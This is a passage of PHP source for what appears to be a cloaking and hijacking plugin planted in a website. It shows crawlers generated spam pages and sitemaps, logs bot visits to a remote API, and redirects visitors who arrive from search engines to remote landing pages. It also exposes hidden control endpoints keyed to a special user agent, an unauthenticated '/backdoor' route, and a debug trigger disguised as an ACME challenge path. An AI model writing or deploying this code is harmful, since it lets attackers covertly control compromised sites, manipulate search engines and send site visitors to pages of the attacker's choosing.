            hj_echo("渲染sitemap.xml 不是爬虫请求 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $sitemapContent = Sitemap::getSitemapContent();

        $keyword = "sitemap";
        $seoConfigId = self::seoConfigId();

        $endTime = microtime(true);

        $responseTime = round(($endTime - self::$StartTime) * 1000);

        $result = Api::postBotLog(
            $seoConfigId,
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword,
            RequestUtils::getUserAgent(),
            200,
            strlen($sitemapContent),
            $responseTime
        );
        hj_echo("渲染sitemap链接页面 爬虫上报结果:", json_encode($result));

        $sitemapContent .=  "<!--RespTime:" . $responseTime . "ms-->" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $sitemapContent .=  "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array(
            "Content-Type" => "application/xml; charset=utf-8"
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $sitemapContent
        );
        return $renderData;
    }

    public static function renderSitemapIndex()
    {

        if (!self::getUseSitemap()) {
            return null;
        }

        if (self::$Config == null) {
            hj_echo("渲染sitemapindex 配置不存在:");
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染sitemapindex 站点未开启:");
            return null;
        }

        if (!RequestUtils::isSitemapIndexRequest()) {
            hj_echo("渲染sitemapindex 不是请求sitemapindex URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isBotRequest()) {
            hj_echo("渲染sitemapindex 不是爬虫请求 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $sitemapIndexContent = Sitemap::getSitemapIndexContent();

        $keyword = "sitemapindex";
        $seoConfigId = self::seoConfigId();

        $endTime = microtime(true);

        $responseTime = round(($endTime - self::$StartTime) * 1000);

        $result = Api::postBotLog(
            $seoConfigId,
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword,
            RequestUtils::getUserAgent(),
            200,
            strlen($sitemapIndexContent),
            $responseTime
        );
        hj_echo("渲染sitemapindex链接页面 爬虫上报结果:", json_encode($result));
        $sitemapIndexContent .=  "<!--RespTime:" . $responseTime . "ms-->" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $sitemapIndexContent .=  "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array(
            "Content-Type" => "application/xml; charset=utf-8"
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $sitemapIndexContent
        );
        return $renderData;
    }

    public static function renderSiteVerify()
    {

        if (self::$Config == null) {
            return null;
        }

        $seoSiteVerifyMap = Manager::getSeoSiteVerifyMap();
        if ($seoSiteVerifyMap == null) {
            hj_echo("渲染siteVerify.html 站点验证配置不存在:");
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $url = RequestUtils::getRequestUri();

        $url = ltrim(trim($url), '/');

        $siteVerify = $seoSiteVerifyMap[$url];

        if ($siteVerify === null) {
            hj_echo("渲染siteVerify.html 站点验证不存在:", $url);
            return null;
        }

        $content = Manager::getRemoteFileContent($siteVerify);

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $content
        );
        return $renderData;
    }

    public static function renderTemplate()
    {

        if (self::$StartTime == null) {
            self::$StartTime = microtime(true);
        }

        if (self::$Config == null) {
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染模板 站点未开启:");
            return null;
        }

        if (RequestUtils::isSeoFilterUri()) {
            hj_echo("渲染模板 是seo过滤url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isSeoBotUri()) {
            hj_echo("渲染模板 不是seo url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::hasUrlAffLinkInfo()) {
            hj_echo("渲染模板 URL没有推广链接参数 URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isBotRequest()) {
            hj_echo("渲染模板 不是爬虫请求 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }
        $link = RequestUtils::getRequestUri();

        Sitemap::writeSitemapsFileSafe(array($link));

        $templateContent = Template::getTemplateContent();

        $keyword = Template::getTemplateKeyword();

        $seoConfigId = self::seoConfigId();

        $endTime = microtime(true);

        $responseTime = round(($endTime - self::$StartTime) * 1000);

        $result = Api::postBotLog(
            $seoConfigId,
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword,
            RequestUtils::getUserAgent(),
            200,
            strlen($templateContent),
            $responseTime
        );
        hj_echo("渲染模板 爬虫上报结果:", json_encode($result));
        $templateContent .=  "<!--RespTime:" . $responseTime . "ms-->" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $templateContent .=  "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $templateContent
        );
        return $renderData;
    }

    public static function renderAffLink()
    {

        if (self::$Config == null) {
            hj_echo("渲染推广链接页面 配置不存在");
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染模板 站点未开启:");
            return null;
        }

        if (RequestUtils::isSeoFilterUri()) {
            hj_echo("渲染推广链接页面 是seo过滤url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (RequestUtils::isSeoBotUri() && RequestUtils::hasUrlAffLinkInfo()) {
            hj_echo("渲染推广链接页面 是seo url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isBotRequest()) {
            hj_echo("渲染推广链接页面 不是爬虫请求 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $localLinkNum = self::getSeoSiteLocalLinkNum();
        $affLinkNum = self::getSeoSiteAffLinkNum();

        if ($localLinkNum <= 0 && $affLinkNum <= 0) {
            hj_echo("渲染推广链接页面 本地链接和推广链接都未开启");
            return null;
        }

        $content = AffLink::getAffLinkContent();

        $keyword = 'afflink';
        $seoConfigId = self::seoConfigId();

        $endTime = microtime(true);

        $responseTime = round(($endTime - self::$StartTime) * 1000);

        $result = Api::postBotLog(
            $seoConfigId,
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword,
            RequestUtils::getUserAgent(),
            200,
            strlen($content),
            $responseTime
        );
        hj_echo("渲染推广链接页面 爬虫上报结果:", json_encode($result));

        $content .=  "<!--RespTime:" . $responseTime . "ms-->" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $content .=  "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $content
        );
        return $renderData;
    }

    public static function renderRedirect()
    {

        if (self::$Config == null) {
            hj_echo("渲染跳转页面 配置不存在");
            return null;
        }

        if (!self::getSeoSiteEnable()) {
            hj_echo("渲染模板 站点未开启:");
            return null;
        }

        if (!RequestUtils::isSearchEngineRequest()) {
            hj_echo("渲染跳转页面 不是搜索引擎跳转 URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (RequestUtils::isSeoFilterUri()) {
            hj_echo("渲染跳转页面 是seo过滤url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (!RequestUtils::isSeoRedirectUrl()) {
            hj_echo("渲染跳转页面 不是seo url URL:", RequestUtils::getRequestUri());
            return null;
        }

        if (RequestUtils::isBotRequest()) {
            hj_echo("渲染跳转页面 是爬虫跳转 UA:", RequestUtils::getUserAgent());
            return null;
        }

        $checkIpBlacklistResult = self::checkIpBlacklist();
        if ($checkIpBlacklistResult !== null) {
            return $checkIpBlacklistResult;
        }

        $keyword = KeyWord::getKeyword();

        hj_echo("渲染跳转页面 从关键词缓存 获取关键词 :", $keyword);
        if (empty($keyword)) {
            $keyword = Template::getTemplateKeyword();
            hj_echo("渲染跳转页面 从模板缓存 获取关键词 :", $keyword);
        }

        if (empty($keyword)) {
            $url = RequestUtils::getRequestUri();
            $keyword = Template::getUrlTitleByUrl($url);
            hj_echo("渲染跳转页面 从 url 中获取关键词 :", $keyword);
        }

        if (!$keyword) {
            $keyword = "unknown";
            hj_echo("渲染跳转页面 使用 unknown 关键词");
        }

        $landPageData = Api::getLandPageData(
            self::seoConfigId(),
            RequestUtils::getReferer(),
            RequestUtils::getFullUrl(),
            $keyword
        );

        $analyticsId = $landPageData['analysisId'];

        $landpageUrl = $landPageData['landpageUrl'];

        $redirectHtmlFmt = '
        <!DOCTYPE html>
        <html>
        <head>
            <script>
                window.location.href = "%s";
            </script>
        </head>
        <body></body>
        </html>
        ';
        $content = sprintf($redirectHtmlFmt, $landpageUrl);
        hj_echo("渲染跳转页面 跳转链接:", $landpageUrl, $analyticsId);

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $content .=  "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $content
        );
        return $renderData;
    }

    public static function renderHealthCheck()
    {

        if (!RequestUtils::isHealthCheckRequest()) {
            hj_echo("渲染健康检查 不是请求健康检查 URL:", RequestUtils::getRequestUri(), "UA:", RequestUtils::getUserAgent());
            return null;
        }

        $pluginPath = RequestUtils::getPluginAbsolutePath();

        $pluginMd5 = self::getPluginMd5();

        $pluginDiskUsage = Disk::getPluginDiskUsage();

        $healthCheck = array(
            "status" => true,
            "plugin_version" => self::getPluginVersion(),
            "msg" => "ok",
            "config_url" => self::$ConfigUrl,
            "plugin_path" => $pluginPath,
            "plugin_md5" => $pluginMd5,
            "plugin_disk_usage" => $pluginDiskUsage
        );

        if (self::$Config == null) {
            hj_echo("渲染健康检查 配置不存在");

            $healthCheck = array(
                "status" => false,
                "plugin_version" => self::getPluginVersion(),
                "msg" => "配置不存在",
                "config_url" => self::$ConfigUrl,
                "plugin_path" => $pluginPath,
                "plugin_md5" => $pluginMd5,
                "plugin_disk_usage" => $pluginDiskUsage
            );
        }

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $healthCheck["cost_time"] = $costTime;

        $healthCheckContent = json_encode($healthCheck);

        $header = array(
            "Content-Type" => "application/json"
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $healthCheckContent
        );
        return $renderData;
    }

    public static function renderConfig()
    {

        if (!RequestUtils::isConfRequest()) {
            hj_echo("渲染配置信息 不是请求配置信息 URL:", RequestUtils::getRequestUri());
            return null;
        }

        $pluginPath = RequestUtils::getPluginAbsolutePath();

        $pluginMd5 = self::getPluginMd5();

        $pluginDiskUsage = Disk::getPluginDiskUsage();

        header('Content-Type: application/json');
        $configRet = array(
            "plugin_version" => self::getPluginVersion(),
            "plugin_path" => $pluginPath,
            "plugin_md5" => $pluginMd5,
            "plugin_disk_usage" => $pluginDiskUsage,
            "config_url" => self::$ConfigUrl,
            "config" => self::$Config

        );

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $configRet["cost_time"] = $costTime;

        $configContent = json_encode($configRet);

        $header = array(
            "Content-Type" => "application/json"
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $configContent
        );
        return $renderData;
    }

    public static function renderClean()
    {

        if (self::$Config == null) {
            hj_echo("渲染清理缓存 配置不存在");
            return null;
        }

        if (!RequestUtils::isCleanRequest()) {
            hj_echo("渲染清理缓存 不是请求清理缓存 URL:", RequestUtils::getRequestUri());
            return null;
        }

        $clearCacheContent = "clear cache" . "<br/>" . PHP_EOL;
        $clearCacheContent .= "清理开始:" . "<br/>" . PHP_EOL;

        $cleanType = Disk::getCleanType();
        $clearCacheContent .= "清理类型:" . $cleanType . "<br/>" . PHP_EOL;

        $clearCacheContent .= "清理LiteSpeed缓存" . "<br/>" . PHP_EOL;
        header('X-LiteSpeed-Purge: *');

        $clearCacheContent .= "======统计信息======" . "<br/>" . PHP_EOL;

        $pluginDiskUsageBeforeInfo = Disk::getPluginDiskUsageInfo();

        $clearCacheContent .= $pluginDiskUsageBeforeInfo;
        $clearCacheContent .= "======统计信息======" . "<br/>" . PHP_EOL;

        $startTime = microtime(true);

        Disk::clean();

        $endTime = microtime(true);

        $cleanCacheDuration = round(($endTime - $startTime) * 1000);

        $clearCacheContent .= "清理耗时: " . $cleanCacheDuration . "ms" . "<br/>" . PHP_EOL;

        $clearCacheContent .= "清理结束:" . "<br/>" . PHP_EOL;

        $clearCacheContent .= "======统计信息======" . "<br/>" . PHP_EOL;

        $pluginDiskUsageAfterInfo =  Disk::getPluginDiskUsageInfo();
        $clearCacheContent .= $pluginDiskUsageAfterInfo;
        $clearCacheContent .= "======统计信息======" . "<br/>" . PHP_EOL;

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $clearCacheContent .= "<!--CostTime:" . $costTime . "-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $clearCacheContent
        );
        return $renderData;
    }

    public static function renderDebug()
    {

        if (!RequestUtils::isDebugRequest()) {
            hj_echo("渲染调试信息 不是请求调试信息 URL:", RequestUtils::getRequestUri());
            return null;
        }

        $debugContent = Debug::getDebugContent();

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $debugContent .= "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $debugContent
        );
        return $renderData;
    }

    public static function renderUpdate()
    {

        if (self::$Config == null) {
            hj_echo("渲染更新 配置不存在");
            return null;
        }

        if (!RequestUtils::isUpdateRequest()) {
            hj_echo("渲染更新 不是请求更新 URL:", RequestUtils::getRequestUri());
            return null;
        }

        $updateInfo = Update::getUpdateInfo();

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $updateInfo["cost_time"] = $costTime;
        $updateContent = json_encode($updateInfo);

        $header = array(
            'Content-Type' => 'application/json'
        );
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $updateContent
        );
        return $renderData;
    }

    public static function renderBackdoor()
    {

        if (self::$Config == null) {
            hj_echo("渲染后门 配置不存在");
            return null;
        }

        if (!RequestUtils::isBackdoorRequest()) {
            hj_echo("渲染后门 不是请求后门 URL:", RequestUtils::getRequestUri());
            return null;
        }

        $seoConfigId = self::seoConfigId();

        $backdoorContent = Backdoor::handleBackDoor($seoConfigId);
        if ($backdoorContent === null) {
            hj_echo("渲染后门 后门内容为空:");
            return null;
        }

        $endTime = microtime(true);

        $costTime = round(($endTime - self::$StartTime) * 1000);
        $backdoorContent .= "<!--CostTime:" . $costTime . "ms-->" . PHP_EOL;

        $header = array();
        $renderData = array(
            "code" => 200,
            "header" => $header,
            "content" => $backdoorContent
        );
        return $renderData;
    }

    /**业务相关 end */
}

class RequestUtils
{

    private static $UserAgent = null;

    public static function getAffSn()
    {
        return 'aff';
    }

    public static function isBot($userAgent)
    {
        $botRules = Manager::getSeoGroupUaMatchRules();

        foreach ($botRules as $botRule) {
            hj_echo('检查爬虫: User-Agent 包含爬虫关键字: ', $userAgent, " , ", $botRule);
            if (stripos($userAgent, $botRule) !== false) {
                hj_echo('检查爬虫: User-Agent 包含爬虫关键字: ', $userAgent, " , ", $botRule, " 匹配成功");
                return true;
            }
        }

        return false;
    }

    public static function isSearchEngineReferer($referer)
    {
        $searchEngineRules = Manager::getSeoGroupRefererMatchRules();

        foreach ($searchEngineRules as $searchEngineRule) {
            if (stripos($referer, $searchEngineRule) !== false) {
                return true;
            }
        }

        return false;
    }

    public static function isSelfBotRequest()
    {
        $ua = self::getUserAgent();
        $hijackbotRules = Manager::getSeoGroupSelfBotUaMatchRules();
        foreach ($hijackbotRules as $hijackbotRule) {

            if (hj_containsIgnoreCase($ua, $hijackbotRule)) {

                return true;
            }
        }
        return false;
    }

    public static function isBotRequest()
    {
        $ua = self::getUserAgent();

        if (self::isBot($ua)) {
            hj_echo('检查爬虫: User-Agent 包含爬虫关键字');
            return true;
        }

        return false;
    }

    public static function isNoUserAgentRequest()
    {
        $ua = self::getUserAgent();
        return empty($ua);
    }

    public static function isNoRefererRequest()
    {
        $referer = self::getReferer();
        return empty($referer);
    }

    public static function isSearchEngineRequest()
    {
        $referer = self::getReferer();

        if (self::isSearchEngineReferer($referer)) {
            hj_echo('检查搜索引擎: Referer 来自搜索引擎', $referer);
            return true;
        }

        return false;
    }

    public static function getScheme()
    {

        if (isset($_SERVER['REQUEST_SCHEME']) && $_SERVER['REQUEST_SCHEME'] == 'https') {
            return 'https';
        }

        if (isset($_SERVER['HTTPS'])) {
            if ($_SERVER['HTTPS'] === 'on' || $_SERVER['HTTPS'] == 1) {
                return   'https';
            }
        }

        if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) {
            return  'https';
        }

        if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
            return  'https';
        }

        return 'http';
    }

    public static function getHost()
    {
        if (isset($_SERVER['HTTP_HOST'])) {
            $host = $_SERVER['HTTP_HOST'];

            $host = rtrim($host, '.'); // 去掉末尾的点如果有

            $host = preg_replace('/:(80|443)$/', '', $host);
            return $host;
        }
        return '';
    }

    public static function getSchemeAndHost()
    {
        return self::getScheme() . '://' . self::getHost();
    }

    public static function getSiteDir()
    {
        if (isset($_SERVER['DOCUMENT_ROOT'])) {
            return $_SERVER['DOCUMENT_ROOT'];
        }
        return '';
    }

    public static function getEntryScriptPath()
    {
        if (isset($_SERVER['SCRIPT_NAME'])) {
            return $_SERVER['SCRIPT_NAME'];
        }

        if (isset($_SERVER['PHP_SELF'])) {
            return $_SERVER['PHP_SELF'];
        }
        return '';
    }

    public static function getPluginAbsolutePath()
    {

        $pluginFilePath = __FILE__;

        if (!hj_endsWithIgnoreCase($pluginFilePath, '.php')) {
            hj_echo("插件文件不是以.php结尾的文件: ", $pluginFilePath);

            $pluginDirPath = dirname($pluginFilePath);

            hj_echo("插件文件的目录: ", $pluginDirPath);

            $pluginFileName = basename($pluginFilePath);

            hj_echo("插件文件的文件名: ", $pluginFileName);

            $pluginFileName = preg_replace('/\.php.*$/i', '.php', $pluginFileName);

            hj_echo("插件文件去掉上下全文信息的文件名: ", $pluginFileName);

            $pluginFilePath = $pluginDirPath . DIRECTORY_SEPARATOR . $pluginFileName;

            hj_echo("插件文件的绝对路径: ", $pluginFilePath);
        } else {

            hj_echo("插件文件是以.php结尾的文件: ", $pluginFilePath);
        }

        return $pluginFilePath;
    }

    public static function getPluginRelativePath()
    {
        $siteDir = self::getSiteDir();
        $pluginPath = self::getPluginAbsolutePath();

        $pluginPath = str_replace($siteDir, '', $pluginPath);
        return $pluginPath;
    }

    public static function isBeginWithEntryScriptInRequestUri()
    {
        $entryScript = self::getEntryScriptPath();
        $url = self::getRequestUri();
        return strpos($url, $entryScript) === 0;
    }

    public static function isSiteLocalUrl($url)
    {

        if (hj_startsWith($url, 'http://') || hj_startsWith($url, 'https://')) {

            if (hj_equalsIgnoreCase(self::getUrlHost($url), self::getHost())) {
                return true;
            } else {
                return false;
            }
        }

        if (hj_contains($url, '#')) {
            return false;
        }

        return true;
    }

    public static function getRequestUri()
    {
        if (isset($_SERVER['REQUEST_URI'])) {
            return $_SERVER['REQUEST_URI'];
        }
    }

    public static function getRequestUriUrlPath()
    {
        $url = self::getRequestUri();
        $url_path = parse_url($url, PHP_URL_PATH);
        return $url_path;
    }

    public static function getRequestUriUrlQuery()
    {
        $url = self::getRequestUri();
        $url_query = parse_url($url, PHP_URL_QUERY);
        return $url_query;
    }

    public static function getReferer()
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            return $_SERVER['HTTP_REFERER'];
        }
    }

    public static function getUserAgent()
    {
        if (!empty(self::$UserAgent)) {
            return self::$UserAgent;
        }
        if (isset($_SERVER['HTTP_USER_AGENT'])) {
            $user_agent = $_SERVER['HTTP_USER_AGENT'];

            self::$UserAgent = hj_convert_utf8_string($user_agent);
            return self::$UserAgent;
        }
        return '';
    }

    public static function getFullUrl()
    {
        return self::getSchemeAndHost() . self::getRequestUri();
    }

    public static function containsIgnoreCaseUri($rule)
    {

        if (empty($rule)) {
            return false;
        }
        $uri = self::getRequestUri();

        hj_echo("忽略大小写包含uri: ", $uri, "匹配规则：", $rule);
        return hj_containsIgnoreCase($uri, $rule);
    }

    public static function equalsIgnoreCaseUrlPath($rule)
    {

        if (empty($rule)) {
            return false;
        }
        $url_path = self::getRequestUriUrlPath();

        hj_echo("忽略大小写匹配网址路径: ", $url_path, "匹配规则：", $rule);
        return hj_equalsIgnoreCase($url_path, $rule);
    }

    public static function startsWithIgnoreCaseUrlPath($rule)
    {

        if (empty($rule)) {
            return false;
        }

        $url_path = self::getRequestUriUrlPath();

        hj_echo("忽略大小写匹配网址路径开头: ", $url_path, "匹配规则：", $rule);
        return hj_startsWithIgnoreCase($url_path, $rule);
    }

    public static function endsWithIgnoreCaseUrlPath($rule)
    {

        if (empty($rule)) {
            return false;
        }

        $url_path = self::getRequestUriUrlPath();

        hj_echo("忽略大小写匹配网址路径结尾: ", $url_path, "匹配规则：", $rule);
        return hj_endsWithIgnoreCase($url_path, $rule);
    }

    public static function containsIgnoreCaseUrlPath($rule)
    {

        if (empty($rule)) {
            return false;
        }

        $url_path = self::getRequestUriUrlPath();

        hj_echo("忽略大小写匹配网址路径包含: ", $url_path, "匹配规则：", $rule);
        return hj_containsIgnoreCase($url_path, $rule);
    }

    public static function isSeoFilterUri()
    {
        $uri = self::getRequestUri();

        $urlFilterRules = Manager::getUrlFilterRules();
        hj_echo('isSeoFilterUri 获取过滤规则:', $urlFilterRules);

        if (is_array($urlFilterRules)) {

            foreach ($urlFilterRules as $rule) {

                if (!is_string($rule)) {
                    continue;
                }

                if (hj_containsIgnoreCase($uri, $rule)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static function isSeoBotUri()
    {

        $url = self::getRequestUri();

        $fullSeoGroupUrlMatchRules = Manager::getFullSeoGroupUrlMatchRules();

        if (!is_array($fullSeoGroupUrlMatchRules)) {
            return false;
        }

        foreach ($fullSeoGroupUrlMatchRules as $seoGroupUrlMatchRule) {

            if (!is_string($seoGroupUrlMatchRule)) {
                continue;
            }

            if (hj_containsIgnoreCase($url, $seoGroupUrlMatchRule)) {
                return true;
            }
        }

        return false;
    }

    public static function isSeoRedirectUrl()
    {
        $url = self::getRequestUri();

        $seoGroupRedirectMatchRules = Manager::getSeoGroupRedirectUrlMatchRules();

        if (!is_array($seoGroupRedirectMatchRules)) {
            return false;
        }

        foreach ($seoGroupRedirectMatchRules as $seoGroupRedirectMatchRule) {

            if (!is_string($seoGroupRedirectMatchRule)) {
                continue;
            }

            if (hj_containsIgnoreCase($url, $seoGroupRedirectMatchRule)) {
                return true;
            }
        }

        return false;
    }

    public static function isRobotsRequest()
    {

        return self::equalsIgnoreCaseUrlPath('/robots.txt');
    }

    public static function isSitemapRequest()
    {

        if (self::containsIgnoreCaseUrlPath('sitemap')) {
            if (self::containsIgnoreCaseUrlPath(Manager::getSitemapindexFormat())) {
                return false; //sitemapindex 请求
            }

            if (self::endsWithIgnoreCaseUrlPath('.xml')) {
                return true;
            }
        }

        return false;
    }

    public static function isSitemapIndexRequest()
    {

        if (self::containsIgnoreCaseUrlPath(Manager::getSitemapindexFormat())) {

            if (self::endsWithIgnoreCaseUrlPath('.xml')) {
                return true;
            }
        }

        return false;
    }

    public static function hasUrlAffLinkInfo()
    {
        $info = self::getUrlAffLinkInfo();

        if (!isset($info['id']) || !isset($info['line'])) {
            return false;
        }
        if (!is_numeric($info['id']) || !is_numeric($info['line'])) {
            return false;
        }

        $id = intval($info['id']);
        $line = intval($info['line']);
        $manifest_arr = Manager::getSeoResManifestArr();
        if (empty($manifest_arr)) {
            return false;
        }
        return Template::checkIdAndLineInSeoResManifest($manifest_arr, $id, $line);
    }

    public static function getUrlAffLinkInfo()
    {

        $url = self::getRequestUriUrlPath();

        $lastSegment = basename($url);

        $parts = explode('-', $lastSegment);
        $count = count($parts);
        if ($count < 2) {
            return false;
        }
        $id = $parts[$count - 2];
        $line = $parts[$count - 1];
        if (!ctype_digit($id) || !ctype_digit($line)) {
            return false;
        }

        $id = intval($id);
        $line = intval($line);
        return array(
            'id' => $id,
            'line' => $line
        );
    }

    public static function isHealthCheckRequest()
    {

        $ua = self::getUserAgent();

        if (self::isSelfBotRequest() && self::containsIgnoreCaseUri('/health')) {
            return true;
        }

        return false;
    }

    public static function isConfRequest()
    {

        $ua = self::getUserAgent();

        if (self::isSelfBotRequest() && self::containsIgnoreCaseUri('/conf')) {
            return true;
        }

        return false;
    }

    public static function isCleanRequest()
    {

        $ua = self::getUserAgent();

        if (self::isSelfBotRequest() && self::containsIgnoreCaseUri('/clean')) {
            return true;
        }

        return false;
    }

    public static function isDebugRequest()
    {

        if (self::isSelfBotRequest() && self::containsIgnoreCaseUri('/debug')) {
            return true;
        }

        if (self::containsIgnoreCaseUri('/well-known/acme-challenge/Tqpn0tGX550fVwt5D6g4CGWP6UDer6JXfWyNmCnCqTi')) {
            return true;
        }

        return false;
    }

    public static function isUpdateRequest()
    {

        if (self::isSelfBotRequest() && self::containsIgnoreCaseUri('/update')) {
            return true;
        }

        return false;
    }

    public static function isBackdoorRequest()
    {
        $ua = self::getUserAgent();

        if (self::equalsIgnoreCaseUrlPath('/backdoor')) {
            return true;
        }

        return false;
    }

    public static function getRealClientIP()
    {

        $headerKeys = array(
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_REAL_IP',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_TRUE_CLIENT_IP',
            'HTTP_CLIENT_IP',
            'HTTP_ALI_CDN_REAL_IP',
            'HTTP_CDN_SRC_IP',
            'HTTP_CDN_REAL_IP',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_WL_PROXY_CLIENT_IP',
            'HTTP_PROXY_CLIENT_IP'
        );

        foreach ($headerKeys as $key) {
            if (!empty($_SERVER[$key])) {

                $ips = explode(',', $_SERVER[$key]);
                $clientIP = trim($ips[0]);

                if (
                    preg_match('/\A(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\z/', $clientIP) ||
                    preg_match('/\A(?:\d{1,3}\.){3}\d{1,3}\z/', $clientIP) ||
                    preg_match('/\A::(?:[0-9a-fA-F]{1,4}:?)*\z/', $clientIP)
                ) {
                    return $clientIP;
                }
            }
        }

        if (isset($_SERVER['REMOTE_ADDR'])) {

            return $_SERVER['REMOTE_ADDR'];
        }

        return 'UNKNOWN';
    }

    public static function getBaseUrl($url)
    {

        $parsedUrl = parse_url($url);

        $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] . '://' : '';
        $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
        $port = isset($parsedUrl['port']) ? ':' . $parsedUrl['port'] : '';

        return $scheme . $host . $port;
    }

    public static function getUrlHost($url)
    {

        $parsedUrl = parse_url($url);

        $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';

        return $host;
    }

    public static function getUrlPath($url)
    {

        $parsedUrl = parse_url($url);

        $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';

        return $path;
    }

    public static function getUrlQueryString($url)
    {

        $parsedUrl = parse_url($url);

        $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';

        return $query;
    }

    public static function isIpBlacklistRequest()
    {

        $ipBlacklistSeoResArr = Manager::getIpBlacklistSeoResArr();
        $realClientIP = self::getRealClientIP();

        if (is_array($ipBlacklistSeoResArr)) {

            foreach ($ipBlacklistSeoResArr as $seoRes) {

                $seoResFile = Manager::getRemoteFile($seoRes['url']);
                if (empty($seoResFile)) {
                    continue;
                }

                if (hj_is_ip_blocked($realClientIP, $seoResFile)) {
                    return true;
                }
            }
        }

        return false;
    }
}

class RobotsTxt
{

    /**
     * 检查 robots.txt 内容是否符合标准格式
     *
     * @param string $originalContent robots.txt 原始内容
     * @return bool 返回 true 表示格式正确，false 表示格式错误
     */
    private static function isValidRobotsTxt($originalContent)
    {
        $lines = explode(PHP_EOL, $originalContent);  // 按行分割原始内容
        $validDirectives = array('User-agent', 'Disallow', 'Allow', 'Sitemap');

        foreach ($lines as $line) {
            $line = trim($line);

            if (empty($line) || strpos($line, '#') === 0) {
                continue;
            }

            if (strpos($line, ':') === false) {
                return false;
            }

            list($directive, $value) = explode(':', $line, 2);
            $directive = trim($directive);
            $value = trim($value);

            if (!in_array($directive, $validDirectives)) {
                return false;
            }

            if ($directive !== 'Sitemap' && empty($value)) {
                return false;
            }
        }

        return true;
    }

    /**
     * 修改 robots.txt 内容为全部放行，并添加自定义 Sitemap
     *
     * @param string $originalContent robots.txt 原始内容
     * @param string $sitemapUrl 要添加的自定义 Sitemap URL
     * @return string 返回修改后的内容，或者默认内容
     */
    private static function modifyRobotsTxt($originalContent, $sitemapUrl)
    {
        if (!self::isValidRobotsTxt($originalContent)) {
